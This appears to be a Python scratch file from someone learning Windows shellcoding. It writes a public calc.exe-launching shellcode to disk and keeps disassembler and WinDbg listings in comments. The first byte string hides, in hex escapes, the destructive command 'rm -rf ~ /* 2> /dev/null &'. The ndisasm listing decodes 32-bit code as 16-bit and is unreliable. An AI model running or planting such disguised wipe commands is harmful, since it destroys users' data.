shellcode = ("\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20"
"\x2F\x2A\x20\x32\x3e\x20\x2f\x64\x65"
"\x76\x2f\x6e\x75\x6c\x6c\x20\x26")

f = open("questionable-shellcode.bin", "w")
f.write(shellcode)
f.close

# https://packetstormsecurity.com/files/156478/Windows-x86-Null-Free-WinExec-Calc.exe-Shellcode.html

calc_shellcode = ("\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
"\x52\xff\xd0")

f = open("calc_shellcode.bin", "w")
f.write(calc_shellcode)
f.close

"""
ndisasm.exe calc_shellcode.bin

00000000  89E5              mov bp,sp
00000002  83EC20            sub sp,byte +0x20
00000005  31DB              xor bx,bx
00000007  648B5B30          mov bx,[fs:bp+di+0x30]
0000000B  8B5B0C            mov bx,[bp+di+0xc]
0000000E  8B5B1C            mov bx,[bp+di+0x1c]
00000011  8B1B              mov bx,[bp+di]
00000013  8B1B              mov bx,[bp+di]
00000015  8B4308            mov ax,[bp+di+0x8]
00000018  8945FC            mov [di-0x4],ax
0000001B  8B583C            mov bx,[bx+si+0x3c]
0000001E  01C3              add bx,ax
00000020  8B5B78            mov bx,[bp+di+0x78]
00000023  01C3              add bx,ax
00000025  8B7B20            mov di,[bp+di+0x20]
00000028  01C7              add di,ax
0000002A  897DF8            mov [di-0x8],di
0000002D  8B4B24            mov cx,[bp+di+0x24]
00000030  01C1              add cx,ax
00000032  894DF4            mov [di-0xc],cx
00000035  8B531C            mov dx,[bp+di+0x1c]
00000038  01C2              add dx,ax
0000003A  8955F0            mov [di-0x10],dx
0000003D  8B5314            mov dx,[bp+di+0x14]
00000040  8955EC            mov [di-0x14],dx
00000043  EB32              jmp short 0x77
00000045  31C0              xor ax,ax
00000047  8B55EC            mov dx,[di-0x14]
0000004A  8B7DF8            mov di,[di-0x8]
0000004D  8B7518            mov si,[di+0x18]
00000050  31C9              xor cx,cx
00000052  FC                cld
00000053  8B3C              mov di,[si]
00000055  8703              xchg ax,[bp+di]
00000057  7DFC              jnl 0x55
00000059  6683C108          add ecx,byte +0x8
0000005D  F3A6              repe cmpsb
0000005F  7405              jz 0x66
00000061  40                inc ax
00000062  39D0              cmp ax,dx
00000064  72E4              jc 0x4a
00000066  8B4DF4            mov cx,[di-0xc]
00000069  8B55F0            mov dx,[di-0x10]
0000006C  668B04            mov eax,[si]
0000006F  41                inc cx
00000070  8B04              mov ax,[si]
00000072  82                db 0x82
00000073  0345FC            add ax,[di-0x4]
00000076  C3                ret
00000077  BA7878            mov dx,0x7878
0000007A  6563C1            gs arpl cx,ax
0000007D  EA08526857        jmp 0x5768:0x5208
00000082  696E458965        imul bp,[bp+0x45],word 0x6589
00000087  18E8              sbb al,ch
00000089  B8FFFF            mov ax,0xffff
0000008C  FF31              push word [bx+di]
0000008E  C9                leave
0000008F  51                push cx
00000090  682E65            push word 0x652e
00000093  7865              js 0xfa
00000095  686361            push word 0x6163
00000098  6C                insb
00000099  6389E341          arpl [bx+di+0x41e3],cx
0000009D  51                push cx
0000009E  53                push bx
0000009F  FFD0              call ax
000000A1  31C9              xor cx,cx
000000A3  B90165            mov cx,0x6501
000000A6  7373              jnc 0x11b
000000A8  C1E908            shr cx,byte 0x8
000000AB  51                push cx
000000AC  685072            push word 0x7250
000000AF  6F                outsw
000000B0  636845            arpl [bx+si+0x45],bp
000000B3  7869              js 0x11e
000000B5  7489              jz 0x40
000000B7  6518E8            gs sbb al,ch
000000BA  87FF              xchg di,di
000000BC  FF                db 0xff
000000BD  FF31              push word [bx+di]
000000BF  D252FF            rcl byte [bp+si-0x1],cl
000000C2  D0                db 0xd0
"""

"""
0:000> uf MessageBox_exe!main
MessageBox_exe!main [C:\Users\Sales2\Desktop\Shellcoding\MessageBox.exe\MessageBox.exe\MessageBox.exe.cpp @ 11]:
   11 00141750 55              push    ebp
   11 00141751 8bec            mov     ebp,esp
   11 00141753 81ecc0000000    sub     esp,0C0h
   11 00141759 53              push    ebx
   11 0014175a 56              push    esi
   11 0014175b 57              push    edi
   11 0014175c 8dbd40ffffff    lea     edi,[ebp-0C0h]
   11 00141762 b930000000      mov     ecx,30h
   11 00141767 b8cccccccc      mov     eax,0CCCCCCCCh
   11 0014176c f3ab            rep stos dword ptr es:[edi]
15732480 0014176e b916c01400      mov     ecx,offset MessageBox_exe!_NULL_IMPORT_DESCRIPTOR <PERF> (MessageBox_exe+0x1c016) (0014c016)
15732480 00141773 e894fbffff      call    MessageBox_exe!ILT+775(__CheckForDebuggerJustMyCode (0014130c)
   12 00141778 8bf4            mov     esi,esp
   12 0014177a 6a00            push    0
   12 0014177c 68307b1400      push    offset MessageBox_exe!`string' (00147b30)
   12 00141781 683c7b1400      push    offset MessageBox_exe!`string' (00147b3c)
   12 00141786 6a00            push    0
   12 00141788 ff1598b01400    call    dword ptr [MessageBox_exe!_imp__MessageBoxA (0014b098)]
   12 0014178e 3bf4            cmp     esi,esp
   12 00141790 e89bfaffff      call    MessageBox_exe!ILT+555(__RTC_CheckEsp) (00141230)
   17 00141795 33c0            xor     eax,eax
   17 00141797 5f              pop     edi
   17 00141798 5e              pop     esi
   17 00141799 5b              pop     ebx
   17 0014179a 81c4c0000000    add     esp,0C0h
   17 001417a0 3bec            cmp     ebp,esp
   17 001417a2 e889faffff      call    MessageBox_exe!ILT+555(__RTC_CheckEsp) (00141230)
   17 001417a7 8be5            mov     esp,ebp
   17 001417a9 5d              pop     ebp
   17 001417aa c3              ret
0:000> d 00147b30
00147b30  43 6f 72 65 6c 61 6e 00-00 00 00 00 59 6f 75 20  Corelan.....You 
00147b40  68 61 76 65 20 62 65 65-6e 20 70 77 6e 65 64 20  have been pwned 
00147b50  62 79 20 43 6f 72 65 6c-61 6e 00 00 00 00 00 00  by Corelan......
00147b60  00 00 00 00 20 7c 14 00-30 7d 14 00 88 7e 14 00  .... |..0}...~..
00147b70  ac 7e 14 00 ec 7e 14 00-20 7f 14 00 01 00 00 00  .~...~.. .......
00147b80  00 00 00 00 01 00 00 00-01 00 00 00 01 00 00 00  ................
00147b90  01 00 00 00 53 74 61 63-6b 20 61 72 6f 75 6e 64  ....Stack around
00147ba0  20 74 68 65 20 76 61 72-69 61 62 6c 65 20 27 00   the variable '.
0:000> d 00147b3c
00147b3c  59 6f 75 20 68 61 76 65-20 62 65 65 6e 20 70 77  You have been pw
00147b4c  6e 65 64 20 62 79 20 43-6f 72 65 6c 61 6e 00 00  ned by Corelan..
00147b5c  00 00 00 00 00 00 00 00-20 7c 14 00 30 7d 14 00  ........ |..0}..
00147b6c  88 7e 14 00 ac 7e 14 00-ec 7e 14 00 20 7f 14 00  .~...~...~.. ...
00147b7c  01 00 00 00 00 00 00 00-01 00 00 00 01 00 00 00  ................
00147b8c  01 00 00 00 01 00 00 00-53 74 61 63 6b 20 61 72  ........Stack ar
00147b9c  6f 75 6e 64 20 74 68 65-20 76 61 72 69 61 62 6c  ound the variabl
00147bac  65 20 27 00 27 20 77 61-73 20 63 6f 72 72 75 70  e '.' was corrup
"""

# https://reverseengineering.stackexchange.com/questions/27610/cant-resolve-a-function-from-a-process-module-user32-dll-couldnt-resolve-e